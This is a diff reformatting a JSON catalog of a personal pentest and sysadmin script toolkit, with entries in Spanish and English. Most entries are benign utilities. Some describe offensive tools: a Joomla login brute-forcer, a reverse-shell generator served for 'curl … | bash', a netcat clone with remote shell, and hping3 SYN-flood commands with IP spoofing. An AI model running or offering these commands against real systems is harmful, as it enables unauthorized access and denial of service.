@@ -1,122 +1,94 @@
 {
-
-"contrawp_o": {
-    "name": "contrawp_o",
-    "short_desc": "Realiza fuerza bruta contra el panel de administración de Joomla.",
-    "detailed_desc": "Este script automatiza un ataque de fuerza bruta contra el login del panel de administración de Joomla. Utiliza múltiples hilos para probar combinaciones de usuario y contraseñas desde un archivo wordlist (por defecto 'cain.txt'). Extrae automáticamente los campos ocultos del formulario antes de enviar los datos vía POST. Para usarlo, edita el script con la URL del objetivo, el usuario y el archivo de contraseñas, luego ejecuta: python3 script.py."
-},
-
-"pythonnc": {
-  "name": "pythonnc",
-  "short_desc": "Netcat replacement written in Python.",
-  "detailed_desc": "Implements client and server functionalities similar to Netcat. Supports remote command shell (-c), file upload (-u), and command execution (-e) over TCP connections. Can operate in listen mode to accept incoming connections or act as a client to send data. Includes multi-threaded connection handling for concurrent sessions."
-},
-
-
-"virust": {
-    "name": "virust",
-    "short_desc": "Consulta IPs contra VirusTotal e incluye geolocalización.",
-    "detailed_desc": "Este script permite verificar una IP o una lista de IPs (desde un archivo .txt) usando la API de VirusTotal. Reporta cuántos motores la marcan como maliciosa o sospechosa. Además, usa la API pública de ip-api.com para mostrar la ciudad y país asociados a cada IP. Uso: 'python script.py 8.8.8.8' o 'python script.py ips.txt'."
-},
-
-"websave": {
-    "name": "websave",
-    "short_desc": "Monitorea una página web y detecta cambios visibles.",
-    "detailed_desc": "Este script en Go usa 'lynx -dump' para obtener el contenido visible de una URL, lo limpia de texto ruidoso (como fechas o IDs) y lo compara con una versión anterior guardada localmente en /opt/4rji/web-saved/websave. Si detecta cambios, los reporta por consola y los guarda, registrando cada evento en webtrack.log. Uso: ./websave <url>"
-},
-
-"zipcheck": {
-    "name": "zipcheck",
-    "short_desc": "Muestra las principales ciudades de EE.UU. y permite consultar información de un ZIP.",
-    "detailed_desc": "Este script muestra una lista de las 10 principales ciudades de EE.UU. con sus ZIP codes representativos. Además, permite consultar un código ZIP específico y obtener la ciudad y estado correspondiente desde city-data.com. Utiliza colores ANSI para resaltar la salida. Uso: ./zipcheck <zip_code> para hacer una consulta individual."
-},
-
-"urlextract": {
-    "name": "urlextract",
-    "short_desc": "Extrae enlaces (URLs) desde una página web usando lynx.",
-    "detailed_desc": "Este script permite extraer enlaces de una página web utilizando la herramienta 'lynx' en modo texto. Soporta tres modos de filtrado: '-d' para mostrar solo los dominios principales de los enlaces, '-r' para mostrar únicamente los enlaces internos (mismo dominio que el proporcionado) y '-a' para mostrar únicamente los enlaces externos (diferente dominio). El script procesa la salida de 'lynx -dump', filtra las URLs relevantes y aplica los comandos de filtrado según la opción seleccionada. Ejemplo de uso: './urlextract -d https://example.com' mostrará solo los dominios encontrados en la página. Requiere que 'lynx' esté instalado en el sistema."
-},
-
-"dnsquad": {
-    "name": "dnsquad",
-    "short_desc": "Verifica si estás utilizando Quad9 como tu DNS y muestra información relacionada.",
-    "detailed_desc": "Este script realiza una verificación completa del uso de Quad9 como servidor DNS. Incluye consultas a on.quad9.net para validar si estás usando Quad9, realiza una consulta directa a whoami.quad9.net y obtiene la versión del nodo Quad9 desde version.bind. Además, detecta el resolver local usado por el sistema, identifica la IP externa utilizada por el DNS mediante whoami.akamai.net, y ejecuta el binario locip o locipm dependiendo de la arquitectura (amd64 o arm64) para mostrar detalles de geolocalización. También ejecuta una consulta WHOIS para determinar si la IP externa pertenece directamente a Quad9. Al final, muestra la IP pública del sistema y la información de geolocalización (ciudad, región y país) usando ipinfo.io. Requiere tener instalados: curl, dig, whois, y locip/locipm."
-},
-
-"bashfun": {
-  "name": "bashfun",
-  "short_desc": "Genera y añade funciones y variables de entorno personalizadas a Bash/Zsh",
-  "detailed_desc": "Script en Python que define un bloque de configuración para .bashrc y .zshrc. Incluye: evitar cierre con Ctrl+D (setopt ignoreeof); exportar AllowedIPs con subredes predefinidas; función nv() para abrir Neovim dentro de nix-shell en NixOS; espacio para añadir más alias/configuraciones de macOS. Para usar, añade el contenido de la variable `text` a tus archivos de configuración de shell."
-},
-
-"bashcurl": {
-    "name": "bashcurl",
-    "short_desc": "Genera un script de reverse shell y lanza un servidor HTTP.",
-    "detailed_desc": "Este script detecta automáticamente la IP del sistema, genera un script de reverse shell en /tmp/apache/bash con conexión TCP hacia esa IP por el puerto 443, y ofrece iniciar un servidor HTTP en la misma ruta. El script está diseñado para ser descargado y ejecutado remotamente mediante curl, por ejemplo: 'curl http://<IP>/bash | bash'."
-},
-
-
-"barrierinst": {
-    "name": "barrierinst",
-    "short_desc": "Installs Barrier via Flatpak and sets up a startup alias.",
-    "detailed_desc": "This script installs Flatpak, adds the Flathub repository, and installs the Barrier application (used for sharing keyboard/mouse across devices) via Flatpak. It also appends a convenient alias to ~/.zshrc for launching Barrier and reloads the shell configuration to apply the alias immediately."
-},
-
-
-"bannerssh": {
-    "name": "bannerssh",
-    "short_desc": "Disables dynamic MOTD scripts and sets a custom static message.",
-    "detailed_desc": "This script disables all dynamic MOTD components by renaming the scripts in /etc/update-motd.d. It optionally prompts the user to set a static welcome message, including an ASCII banner and custom text, which is written to /etc/motd. Future modifications can be made manually by editing that file."
-},
-
-
-"bannerm": {
-    "name": "bannerm",
-    "short_desc": "Script to set up a login banner warning message.",
-    "detailed_desc": "This script creates a login banner warning message by writing a predefined text to /etc/mctcbanner, setting appropriate permissions, and replacing /etc/issue and /etc/motd with symbolic links to the new file. It also backs up the original /etc/issue and /etc/motd files. This ensures the banner is displayed during both local and remote logins."
-},
-
-"audiodown": {
-    "name": "audiodown",
-    "short_desc": "Descarga automáticamente todos los archivos de audio desde cualquier página web.",
-    "detailed_desc": "Script basado en Puppeteer que abre la página en un navegador headless y captura todas las respuestas HTTP con contenido de audio (por ejemplo .ogg, .mp3, .wav, .m4a, .opus). Guarda cada archivo en un directorio 'downloads'.\n\nUso:\n  node audiodown.js <URL> [--wait 10000]\n\nArgumentos:\n  <URL>        Página web de la cual descargar los audios.\n  --wait ms    Tiempo adicional en milisegundos para mantener la página abierta y permitir que carguen sonidos disparados por animaciones o interacciones.\n\nEjemplo:\n  node audiodown.js https://ejemplo.com --wait 10000\n\nLos audios se guardan automáticamente con nombre único en la carpeta 'downloads'."
-},
-
-"nmap-full": {
-      "name": "nmap_full_scan_report",
-      "short_desc": "Performs a full multi-stage network scan and generates a styled HTML report.",
-      "detailed_desc": "It performs host discovery (ping sweep), fast or deep TCP/UDP port scanning (user-selectable), and includes SMB enumeration, SNMP information retrieval, and a vulnerability scan using nmap NSE scripts. All results are compiled into a visually structured HTML dashboard with metadata (host IP, gateway, subnet), raw outputs, and formatted sections. Ideal for full-scope internal scanning. Usage: sudo ./nmap_full_scan_report.sh <CIDR>."
+    "contrawp_o": {
+        "name": "contrawp_o",
+        "short_desc": "Realiza fuerza bruta contra el panel de administración de Joomla.",
+        "detailed_desc": "Este script automatiza un ataque de fuerza bruta contra el login del panel de administración de Joomla. Utiliza múltiples hilos para probar combinaciones de usuario y contraseñas desde un archivo wordlist (por defecto 'cain.txt'). Extrae automáticamente los campos ocultos del formulario antes de enviar los datos vía POST. Para usarlo, edita el script con la URL del objetivo, el usuario y el archivo de contraseñas, luego ejecuta: python3 script.py."
     },
-
-"nmap-half": {
-      "name": "nmap_half_scan_report",
-      "short_desc": "Performs a quick network scan and generates a basic HTML report.",
-      "detailed_desc": "It performs a ping sweep to identify live hosts, runs a fast top-1000 TCP port scan, and generates an HTML dashboard with IP, network, gateway, and port scan results. The goal is to test the layout and functionality of the report without executing heavier modules like SMB, SNMP, or vulnerability scanning. Usage: sudo ./nmap_half_scan_report.sh <CIDR>."
+    "pythonnc": {
+        "name": "pythonnc",
+        "short_desc": "Netcat replacement written in Python.",
+        "detailed_desc": "Implements client and server functionalities similar to Netcat. Supports remote command shell (-c), file upload (-u), and command execution (-e) over TCP connections. Can operate in listen mode to accept incoming connections or act as a client to send data. Includes multi-threaded connection handling for concurrent sessions."
     },
-
-
+    "virust": {
+        "name": "virust",
+        "short_desc": "Consulta IPs contra VirusTotal e incluye geolocalización.",
+        "detailed_desc": "Este script permite verificar una IP o una lista de IPs (desde un archivo .txt) usando la API de VirusTotal. Reporta cuántos motores la marcan como maliciosa o sospechosa. Además, usa la API pública de ip-api.com para mostrar la ciudad y país asociados a cada IP. Uso: 'python script.py 8.8.8.8' o 'python script.py ips.txt'."
+    },
+    "websave": {
+        "name": "websave",
+        "short_desc": "Monitorea una página web y detecta cambios visibles.",
+        "detailed_desc": "Este script en Go usa 'lynx -dump' para obtener el contenido visible de una URL, lo limpia de texto ruidoso (como fechas o IDs) y lo compara con una versión anterior guardada localmente en /opt/4rji/web-saved/websave. Si detecta cambios, los reporta por consola y los guarda, registrando cada evento en webtrack.log. Uso: ./websave <url>"
+    },
+    "zipcheck": {
+        "name": "zipcheck",
+        "short_desc": "Muestra las principales ciudades de EE.UU. y permite consultar información de un ZIP.",
+        "detailed_desc": "Este script muestra una lista de las 10 principales ciudades de EE.UU. con sus ZIP codes representativos. Además, permite consultar un código ZIP específico y obtener la ciudad y estado correspondiente desde city-data.com. Utiliza colores ANSI para resaltar la salida. Uso: ./zipcheck <zip_code> para hacer una consulta individual."
+    },
+    "urlextract": {
+        "name": "urlextract",
+        "short_desc": "Extrae enlaces (URLs) desde una página web usando lynx.",
+        "detailed_desc": "Este script permite extraer enlaces de una página web utilizando la herramienta 'lynx' en modo texto. Soporta tres modos de filtrado: '-d' para mostrar solo los dominios principales de los enlaces, '-r' para mostrar únicamente los enlaces internos (mismo dominio que el proporcionado) y '-a' para mostrar únicamente los enlaces externos (diferente dominio). El script procesa la salida de 'lynx -dump', filtra las URLs relevantes y aplica los comandos de filtrado según la opción seleccionada. Ejemplo de uso: './urlextract -d https://example.com' mostrará solo los dominios encontrados en la página. Requiere que 'lynx' esté instalado en el sistema."
+    },
+    "dnsquad": {
+        "name": "dnsquad",
+        "short_desc": "Verifica si estás utilizando Quad9 como tu DNS y muestra información relacionada.",
+        "detailed_desc": "Este script realiza una verificación completa del uso de Quad9 como servidor DNS. Incluye consultas a on.quad9.net para validar si estás usando Quad9, realiza una consulta directa a whoami.quad9.net y obtiene la versión del nodo Quad9 desde version.bind. Además, detecta el resolver local usado por el sistema, identifica la IP externa utilizada por el DNS mediante whoami.akamai.net, y ejecuta el binario locip o locipm dependiendo de la arquitectura (amd64 o arm64) para mostrar detalles de geolocalización. También ejecuta una consulta WHOIS para determinar si la IP externa pertenece directamente a Quad9. Al final, muestra la IP pública del sistema y la información de geolocalización (ciudad, región y país) usando ipinfo.io. Requiere tener instalados: curl, dig, whois, y locip/locipm."
+    },
+    "bashfun": {
+        "name": "bashfun",
+        "short_desc": "Genera y añade funciones y variables de entorno personalizadas a Bash/Zsh",
+        "detailed_desc": "Script en Python que define un bloque de configuración para .bashrc y .zshrc. Incluye: evitar cierre con Ctrl+D (setopt ignoreeof); exportar AllowedIPs con subredes predefinidas; función nv() para abrir Neovim dentro de nix-shell en NixOS; espacio para añadir más alias/configuraciones de macOS. Para usar, añade el contenido de la variable `text` a tus archivos de configuración de shell."
+    },
+    "bashcurl": {
+        "name": "bashcurl",
+        "short_desc": "Genera un script de reverse shell y lanza un servidor HTTP.",
+        "detailed_desc": "Este script detecta automáticamente la IP del sistema, genera un script de reverse shell en /tmp/apache/bash con conexión TCP hacia esa IP por el puerto 443, y ofrece iniciar un servidor HTTP en la misma ruta. El script está diseñado para ser descargado y ejecutado remotamente mediante curl, por ejemplo: 'curl http://<IP>/bash | bash'."
+    },
+    "barrierinst": {
+        "name": "barrierinst",
+        "short_desc": "Installs Barrier via Flatpak and sets up a startup alias.",
+        "detailed_desc": "This script installs Flatpak, adds the Flathub repository, and installs the Barrier application (used for sharing keyboard/mouse across devices) via Flatpak. It also appends a convenient alias to ~/.zshrc for launching Barrier and reloads the shell configuration to apply the alias immediately."
+    },
+    "bannerssh": {
+        "name": "bannerssh",
+        "short_desc": "Disables dynamic MOTD scripts and sets a custom static message.",
+        "detailed_desc": "This script disables all dynamic MOTD components by renaming the scripts in /etc/update-motd.d. It optionally prompts the user to set a static welcome message, including an ASCII banner and custom text, which is written to /etc/motd. Future modifications can be made manually by editing that file."
+    },
+    "bannerm": {
+        "name": "bannerm",
+        "short_desc": "Script to set up a login banner warning message.",
+        "detailed_desc": "This script creates a login banner warning message by writing a predefined text to /etc/mctcbanner, setting appropriate permissions, and replacing /etc/issue and /etc/motd with symbolic links to the new file. It also backs up the original /etc/issue and /etc/motd files. This ensures the banner is displayed during both local and remote logins."
+    },
+    "audiodown": {
+        "name": "audiodown",
+        "short_desc": "Descarga automáticamente todos los archivos de audio desde cualquier página web.",
+        "detailed_desc": "Script basado en Puppeteer que abre la página en un navegador headless y captura todas las respuestas HTTP con contenido de audio (por ejemplo .ogg, .mp3, .wav, .m4a, .opus). Guarda cada archivo en un directorio 'downloads'.\n\nUso:\n  node audiodown.js <URL> [--wait 10000]\n\nArgumentos:\n  <URL>        Página web de la cual descargar los audios.\n  --wait ms    Tiempo adicional en milisegundos para mantener la página abierta y permitir que carguen sonidos disparados por animaciones o interacciones.\n\nEjemplo:\n  node audiodown.js https://ejemplo.com --wait 10000\n\nLos audios se guardan automáticamente con nombre único en la carpeta 'downloads'."
+    },
+    "nmap-full": {
+        "name": "nmap_full_scan_report",
+        "short_desc": "Performs a full multi-stage network scan and generates a styled HTML report.",
+        "detailed_desc": "It performs host discovery (ping sweep), fast or deep TCP/UDP port scanning (user-selectable), and includes SMB enumeration, SNMP information retrieval, and a vulnerability scan using nmap NSE scripts. All results are compiled into a visually structured HTML dashboard with metadata (host IP, gateway, subnet), raw outputs, and formatted sections. Ideal for full-scope internal scanning. Usage: sudo ./nmap_full_scan_report.sh <CIDR>."
+    },
+    "nmap-half": {
+        "name": "nmap_half_scan_report",
+        "short_desc": "Performs a quick network scan and generates a basic HTML report.",
+        "detailed_desc": "It performs a ping sweep to identify live hosts, runs a fast top-1000 TCP port scan, and generates an HTML dashboard with IP, network, gateway, and port scan results. The goal is to test the layout and functionality of the report without executing heavier modules like SMB, SNMP, or vulnerability scanning. Usage: sudo ./nmap_half_scan_report.sh <CIDR>."
+    },
     "maskapps": {
         "name": "ipsclean",
         "short_desc": "mask ftpd tftpd and remove others.",
         "detailed_desc": "9   │ sudo apt remove -y telnet ftp ftpd tftp talk talkd tftp tftpd"
     },
-
     "ipsclean": {
         "name": "ipsclean",
         "short_desc": "Script to extract and clean IP addresses from any file.",
         "detailed_desc": "This script extracts all IPv4 addresses from a given file, using strings to ensure data is readable even from binaries. It allows the user to sort and deduplicate the results, saving them into ips.txt. It displays the commands executed and counts the number of extracted IPs.\n\nUsage:\n  ./ipsclean archivo\n\nMain commands executed:\n  - strings to extract printable characters.\n  - grep -Eo to match IP address patterns.\n  - sort -u (optional) to remove duplicates.\n  - wc -l to count the number of extracted IPs.\n\nThe script colors outputs for better visibility (success, warnings, errors)."
     },
-
-
     "ipt": {
         "name": "ipt",
         "short_desc": "ipt para activar o desactivar iptables y mostrar las reglas actuales.",
         "detailed_desc": "Este script lista las reglas de iptables, luego pregunta al usuario si desea activar (ACCEPT todo y limpiar reglas) o desactivar (DROP todo) el firewall. Finalmente vuelve a mostrar las reglas actuales. Comandos principales: `sudo iptables -L`, `sudo iptables -P INPUT DROP`, `sudo iptables -P FORWARD DROP`, `sudo iptables -P OUTPUT DROP`, `sudo iptables -P INPUT ACCEPT`, `sudo iptables -P FORWARD ACCEPT`, `sudo iptables -P OUTPUT ACCEPT`, `sudo iptables -F`."
     },
-
-
-
-    
     "backd": {
         "name": "backd",
         "short_desc": "Monitorea conexiones de red establecidas y muestra datos del proceso en tiempo real.",
@@ -127,139 +99,116 @@
         "short_desc": "Procesa archivos de configuración eliminando comentarios y líneas vacías.",
         "detailed_desc": "Este script permite procesar archivos de configuración para extraer solo las líneas útiles, eliminando comentarios y líneas vacías.\n\nUso: comentadas [-v] [-c] [-b] archivo\n\nOpciones:\n1. -v: Muestra resultados en terminal sin comentarios ni líneas vacías\n2. -c: Genera un archivo clean.conf con líneas sin comentarios ni vacías\n3. -b: Entra en modo interactivo para modificar el archivo, permitiendo buscar líneas, comentarlas y reemplazarlas\n\nSin opciones, copia al portapapeles el contenido del archivo sin comentarios ni líneas vacías.\n\nÚtil para limpiar y editar archivos de configuración de forma rápida y eficiente."
     },
-    
     "ayudabinario": {
         "name": "ayudabinario",
         "short_desc": "Agrega mensajes de ayuda personalizados a scripts bash/zsh.",
         "detailed_desc": "Este script modifica archivos bash/zsh para agregar un mensaje de ayuda personalizado que se muestra al usar el argumento -h.\n\nUso: ./ayudabinario <archivo_a_modificar>\n\nEl proceso:\n1. Solicita al usuario un mensaje de ayuda personalizado\n2. Modifica el archivo especificado para:\n   - Asegurar que el shebang sea #!/bin/bash\n   - Agregar una función show_help_and_confirm() que muestra el mensaje\n   - Formatea el mensaje con colores en la terminal\n3. El mensaje de ayuda se mostrará cuando se ejecute el script con -h\n\nÚtil para estandarizar y mejorar la documentación de scripts bash/zsh."
     },
-    
     "decoyfile": {
         "name": "decoyfile",
         "short_desc": "Recopila metadatos de archivos para crear señuelos de tiempos de acceso.",
         "detailed_desc": "Este script solicita al usuario la ruta de un archivo, obtiene sus marcas de tiempo (creación, modificación y acceso) en formato legible y las agrega a un archivo de registro.\n\nUso: agregararchivo\n\nEl proceso:\n1. Solicita al usuario la ruta del archivo a analizar\n2. Extrae las marcas de tiempo (creación, modificación y acceso) del archivo\n3. Formatea las fechas de manera legible\n4. Guarda esta información en /opt/decoys/decoys.txt\n5. Crea automáticamente el directorio de destino si no existe\n\nÚtil para análisis forense y creación de señuelos con marcas de tiempo específicas. Usar decoyfilecheck para ver si se modificó el archivo, útil para detectar si alguien cambió archivos importantes como hosts o dns."
     },
-    
     "adio": {
         "name": "adio",
         "short_desc": "Elimina archivos de forma segura usando técnicas de borrado militar (DoD) y sobreescritura.",
         "detailed_desc": "Este script borra archivos de manera segura utilizando una combinación de las herramientas 'scrub' y 'shred' para garantizar que los datos no puedan ser recuperados.\n\nUso: adio <archivo>\n\nEl proceso:\n1. Primero aplica 'scrub' con el patrón DoD (Department of Defense)\n2. Luego utiliza 'shred' para sobreescribir el archivo 10 veces con datos aleatorios\n3. Finalmente elimina el archivo del sistema\n\nIMPORTANTE: Una vez ejecutado, el archivo no podrá ser recuperado."
     },
-    
     "adios": {
         "name": "adios",
         "short_desc": "Elimina directorios completos de forma segura aplicando técnicas de borrado militar recursivamente.",
         "detailed_desc": "Este script borra directorios completos de manera segura, aplicando técnicas de borrado militar a todos los archivos dentro del directorio y sus subdirectorios.\n\nUso: adios <directorio>\n\nEl proceso:\n1. Recorre recursivamente el directorio y todos sus subdirectorios\n2. Aplica 'scrub' con el patrón DoD a cada archivo encontrado\n3. Luego utiliza 'shred' para sobreescribir cada archivo 10 veces con datos aleatorios\n4. Finalmente elimina el directorio completo y su contenido\n\nIMPORTANTE: Una vez ejecutado, los archivos y el directorio no podrán ser recuperados."
     },
-    
     "proxyverifica": {
         "name": "proxyverifica",
         "short_desc": "Verifies the functionality of proxies using a CSV file.",
         "detailed_desc": "This script verifies if proxies are functional. It requires a CSV file containing the list of proxies.\n\nUsage instructions:\n\n1. Prepare the proxy list in the following CSV format:\n   - Example: 66.60.150.190,80,US,United States,anonymous\n\n2. To format the list, use the following command:\n   - `awk '{print $1 \":\" $2}' lista > proxylist.csv`\n   - This command combines the IP and port to generate the required file.\n\n3. Run the script to verify the proxies."
     },
-    
     "proxyloco": {
         "name": "proxyloco",
         "short_desc": "Downloads, configures, and launches ligolo-ng Agent or Proxy with guided setup.",
         "detailed_desc": "This script automates the process of downloading ligolo-ng binaries (Agent/Proxy), extracting them, and assisting with configuration and execution based on user input.\n\nUsage instructions:\n\n1. Run without arguments to interactively choose binaries and setup Agent or Proxy.\n2. Use `./proxyloco -2` to access additional proxy tunnel setup commands, crontab examples, and agent launch instructions.\n3. Supports both AMD64 and ARM64 architectures with visual guidance and command tips.\n\nProxy quick commands:\n\n1.- Return to the proxy session: session\n2.- Start the proxy: start\n\nTo delete the subnet:\nsudo ip link delete ligolo\nsudo ip route add 1.1.1.0/24 dev ligolo\n\n# Second tunnel:\nsudo ip tuntap add user $USER mode tun ligolo2\nsudo ip link set ligolo2 up\nsudo ip route add X.X.X.0/24 dev ligolo2\nstart --tun ligolo2"
     },
-    
     "grepfind": {
         "name": "grepfind",
         "short_desc": "Busca una palabra en todos los archivos de un directorio y subdirectorios usando find y grep.",
         "detailed_desc": "find <directorio> -type f -exec grep -H --color=always \"<palabra>\" {} \\;"
     },
-    
     "redr": {
         "name": "redr",
         "short_desc": "Reinicia los servicios de red según la distribución Linux.",
         "detailed_desc": "sudo dhclient eth1\nsudo systemctl restart network-manager\nsudo service networking restart\nsudo systemctl restart network\nsudo systemctl restart NetworkManager"
     },
-    
     "lineas": {
         "name": "lineas",
         "short_desc": "Muestra líneas de diferentes colores en la terminal.",
         "detailed_desc": "echo -e \"\\033[1;31m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;32m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;33m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;34m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;35m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;36m_________________________________________________________\\033[0m\"\necho -e \"\\033[1;37m_________________________________________________________\\033[0m\""
     },
-    
     "impactoinst": {
         "name": "impactoinst",
         "short_desc": "Instala Impacket y configura SMBServer.",
         "detailed_desc": "cp /opt/4rji/bin/impacto.zip .\nunzip impacto.zip\ncd impacket\npip3 install .\nimpacket-smbserver Nombre_share $(pwd) -smb2support"
     },
-    
     "limpiartest": {
         "name": "limpiartest",
         "short_desc": "Genera archivos aleatorios para pruebas.",
         "detailed_desc": "dd if=/dev/urandom of=file_$i bs=1M count=$size"
     },
-    
     "crontt": {
         "name": "crontt",
         "short_desc": "Muestra los crontabs del usuario actual y root.",
         "detailed_desc": "crontab -l\nsudo crontab -l"
     },
-    
     "rootcheck": {
         "name": "rootcheck",
         "short_desc": "Muestra los archivos de configuración del usuario root.",
         "detailed_desc": "sudo cat /root/.bashrc\nsudo cat /root/.shrc\nsudo cat /root/.cshrc\nsudo cat /root/.tcshrc"
     },
-    
     "inundacion": {
         "name": "inundacion",
         "short_desc": "Realiza ataques de inundación SYN.",
         "detailed_desc": "sudo hping3 <ip_objetivo> --flood -S -p 445\nsudo hping3 --flood -S <ip_objetivo> -a <ip_suplantar> -s 445 -p 445"
     },
-    
     "searchinst": {
         "name": "searchinst",
         "short_desc": "Instala y configura SearXNG en Docker.",
         "detailed_desc": "docker pull searxng/searxng\ndocker run --rm -d -p 9999:8080 -v \"${PWD}/searxng:/etc/searxng\" -e \"BASE_URL=http://localhost:9999/\" -e \"INSTANCE_NAME=my-instance\" searxng/searxng"
     },
-    
     "updatecentos7": {
         "name": "updatecentos7",
         "short_desc": "Actualiza el repositorio base de CentOS 7.",
         "detailed_desc": "sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://el7.repo.almalinux.org/centos/CentOS-Base.repo"
     },
-    
     "dcc_spanish": {
         "name": "dcc_spanish",
         "short_desc": "Configura y ejecuta contenedores Docker con IPs aleatorias.",
         "detailed_desc": "docker run -it --network <red> --ip <ip_aleatoria> <imagen>"
     },
-    
     "honeyport.sh": {
         "name": "honeyport.sh",
         "short_desc": "Implementa un honeyport que bloquea IPs que intentan conectarse.",
         "detailed_desc": "sudo nc -l -p 8080 -v\nsudo iptables -A INPUT -s <ip> -j DROP"
     },
-    
     "chtm": {
         "name": "chtm",
         "short_desc": "Protege archivos contra modificaciones en macOS.",
         "detailed_desc": "sudo chflags uchg <archivo>"
     },
-    
     "f2binst": {
         "name": "f2binst",
         "short_desc": "Instala y configura fail2ban y dependencias.",
         "detailed_desc": "sudo apt-get install -y iptables\nsudo apt-get install -y rsyslog\nsudo apt-get install -y fail2ban"
     },
-    
     "artilleria": {
         "name": "artilleria",
         "short_desc": "Instala iptables en diferentes distribuciones Linux.",
         "detailed_desc": "sudo apt-get install -y iptables\nsudo yum install -y iptables\nsudo dnf install -y iptables\nsudo pacman -S iptables"
     },
-    
     "ansiconf": {
         "name": "ansiconf",
         "short_desc": "Configura el archivo de hosts de Ansible.",
         "detailed_desc": "echo \"[hosts]\n<alias> ansible_host=<host> ansible_port=<port> ansible_user=<username> ansible_ssh_private_key_file=<key_path>\" >> ~/.ssh/ansible_hosts"
     },
-    
     "amigo2inst": {
         "name": "amigo2inst",
         "short_desc": "Instala y ejecuta Ollama con modelos de IA.",
@@ -275,163 +224,136 @@
         "short_desc": "Configura knockd para abrir/cerrar puerto HTTP.",
         "detailed_desc": "echo \"[openHTTP]\n    sequence    = 8000,8800,8888\n    seq_timeout = 5\n    command     = /opt/4rji/bin/open_http.sh\n    tcpflags    = syn\n\n[closeHTTP]\n    sequence    = 8888,8800,8000\n    seq_timeout = 5\n    command     = /opt/4rji/bin/close_http.sh\n    tcpflags    = syn\" | sudo tee -a /etc/knockd.conf"
     },
-    
     "splunkforw": {
         "name": "splunkforw",
         "short_desc": "Instala Splunk Universal Forwarder en diferentes sistemas operativos.",
         "detailed_desc": "curl -O https://download.splunk.com/products/universalforwarder/releases/9.4.0/linux/splunkforwarder-9.4.0-<arch>.deb\nsudo dpkg -i splunkforwarder-9.4.0-<arch>.deb"
     },
-    
     "csftp": {
         "name": "csftp",
         "short_desc": "Establece una conexión SFTP para transferir archivos.",
         "detailed_desc": "sftp <usuario>@<ip>:<archivo> ~"
     },
-    
     "protoninicio": {
         "name": "protoninicio",
         "short_desc": "Configura y ejecuta OpenVPN como servicio systemd.",
         "detailed_desc": "sudo systemctl daemon-reload\nsudo systemctl enable openvpn.service\nsudo systemctl start openvpn.service"
     },
-    
     "lazyvpn": {
         "name": "lazyvpn",
         "short_desc": "Descarga e instala un script de configuración de OpenVPN.",
         "detailed_desc": "wget https://git.io/vpn -O openvpn-install.sh && bash openvpn-install.sh"
     },
-    
     "lazydinst": {
         "name": "lazydinst",
         "short_desc": "Instala lazydocker y sus dependencias.",
         "detailed_desc": "sudo apt-get update && sudo apt-get install -y golang-go\ngit clone https://github.com/jesseduffield/lazydocker.git\ncd lazydocker\ngo install"
     },
-    
     "todo.bash": {
         "name": "todo.bash",
         "short_desc": "Busca tareas en un archivo de texto.",
         "detailed_desc": "cat ~/.todo.txt | grep <palabra>"
     },
-    
     "proceso": {
         "name": "proceso",
         "short_desc": "Muestra información detallada de los procesos del sistema.",
         "detailed_desc": "ps -eo user,comm,pid"
     },
-    
     "dnsleak": {
         "name": "dnsleak",
         "short_desc": "Prueba de fugas de DNS con soporte para interfaces específicas.",
         "detailed_desc": "curl --interface <interface> https://bash.ws/dnsleak\nping -I <interface> bash.ws"
     },
-    
     "nviminst": {
         "name": "nviminst",
         "short_desc": "Instala Neovim y sus dependencias desde el código fuente.",
         "detailed_desc": "sudo apt install ninja-build gettext libtool libtool-bin autoconf automake cmake g++ pkg-config unzip curl doxygen -y\ngit clone https://github.com/neovim/neovim\ncd neovim\nmake CMAKE_BUILD_TYPE=Release\nsudo make install\ngit clone https://github.com/NvChad/starter ~/.config/nvim"
     },
-    
     "ccssh": {
         "name": "ccssh",
         "short_desc": "Establece conexión SSH con verificación de permisos.",
         "detailed_desc": "ssh -p <puerto> <usuario>@<ip>"
     },
-    
     "batfzf": {
         "name": "batfzf",
         "short_desc": "Configura bat, fzf, thefuck y zoxide con temas personalizados.",
         "detailed_desc": "Este script automatiza la configuración de varias herramientas de línea de comandos para mejorar la experiencia del usuario en la terminal.\n\nDescarga y aplica un tema personalizado para 'bat', un visualizador de archivos similar a 'cat' pero con resaltado de sintaxis.\n\nConfigura 'fzf', una herramienta de búsqueda interactiva, con opciones avanzadas de previsualización.\n\nTambién instala 'thefuck', que corrige comandos mal escritos, y 'zoxide', un mejorado comando 'cd'.\n\nLas configuraciones se añaden al archivo .zshrc para que se apliquen automáticamente al iniciar una nueva sesión de terminal. \n\nLuego solo escribe fuck o fk para que el comando se corrija automáticamente.  "
     },
-    
     "qemuconsola": {
         "name": "qemuconsola",
         "short_desc": "Habilita y inicia el servicio de consola serial en QEMU.",
         "detailed_desc": "sudo systemctl enable serial-getty@ttyS0.service\nsudo systemctl start serial-getty@ttyS0.service"
     },
-    
     "sntp": {
         "name": "sntp",
         "short_desc": "Instala y configura Chrony para sincronización de tiempo.",
         "detailed_desc": "sudo apt-get install chrony -f\nsudo systemctl restart chrony\nsudo systemctl status chrony"
     },
-    
     "sweepnet": {
         "name": "sweepnet",
         "short_desc": "Escanea una red completa usando sweep.",
         "detailed_desc": "sweep <ip_base>.{1..255}.{1..255}"
     },
-    
     "ssa_arch": {
         "name": "ssa_arch",
         "short_desc": "Muestra información del sistema y controla el servicio SSH.",
         "detailed_desc": "ssa1 > tempfile\nbatcat -l rb tempfile\nsudo systemctl stop sshd\nsudo systemctl start sshd\n/usr/sbin/ifconfig wlp0s20f3 | grep \"inet \" | awk '{print $2}'\nwhoami"
     },
-    
     "pas": {
         "name": "pas",
         "short_desc": "Guarda el contenido del portapapeles en un archivo.",
         "detailed_desc": "xclip -selection clipboard -o >> $htf"
     },
-    
     "lsofmonitor1": {
         "name": "lsofmonitor1",
         "short_desc": "Monitorea nuevas conexiones de red usando lsof.",
         "detailed_desc": "lsof -i -P -n | awk 'NR==1 || !seen[$0]++' > /tmp/conexiones_actuales\ncomm -13 /tmp/conexiones_previas /tmp/conexiones_actuales"
     },
-    
     "pingz": {
         "name": "pingz",
         "short_desc": "Monitorea el estado de hosts definidos en el archivo de configuración SSH.",
         "detailed_desc": "ping -c 1 <host>\nssh -p <puerto> <host>"
     },
-    
     "hashf": {
         "name": "hashf",
